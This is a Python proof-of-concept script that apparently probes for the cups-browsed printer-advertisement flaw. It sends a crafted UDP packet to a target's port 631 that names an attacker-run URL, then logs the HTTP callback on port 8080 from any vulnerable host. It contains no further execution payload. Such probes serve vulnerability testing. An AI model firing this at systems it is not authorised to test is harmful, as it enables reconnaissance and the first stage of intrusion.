import socket
import threading
import time
import sys

HTTP_PORT = 8080
UDP_PORT = 631

def send_udp_packet(target_ip, port, message):
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        # Send the UDP packet
        sock.sendto(message.encode(), (target_ip, port))
        print(f"UDP packet sent to {target_ip}:{port}")
    except Exception as e:
        print(f"Error sending UDP packet: {e}")
    finally:
        sock.close()

def http_listener(port={HTTP_PORT}):
    # Create a TCP socket for HTTP
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        server_socket.bind(('0.0.0.0', port))
        server_socket.listen(5)
        print(f"HTTP listener started on port {port}")
        
        while True:
            client_socket, address = server_socket.accept()
            print(f"Connection from {address}")
            
            data = b''
            while True:
                part = client_socket.recv(1024)
                data += part
                if len(part) < 1024:
                    break
            
            print(f"HTTP Request:\n{data.decode('utf-8', errors='replace')}")
            
            # Send response
            response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello, World!"
            client_socket.sendall(response.encode())
            client_socket.close()

    except Exception as e:
        print(f"Error in HTTP listener: {e}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python script_name.py <TARGET_IP> <SERVER_IP>")
        sys.exit(1)

    TARGET_IP = sys.argv[1]  # IP for sending the UDP packet
    SERVER_IP = sys.argv[2]  # IP for HTTP message content
    
    
    
    MESSAGE = f"0 3 http://{SERVER_IP}:{HTTP_PORT}/printers/"

    # Start HTTP listener in a separate thread
    http_thread = threading.Thread(target=http_listener, args=(HTTP_PORT,))
    http_thread.start()

    # Wait for HTTP server to start
    time.sleep(1)

    # Send UDP packet after HTTP server is up
    send_udp_packet(TARGET_IP, UDP_PORT, MESSAGE)

    # Keep the main thread alive to keep the HTTP server running
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("Stopping the server.")
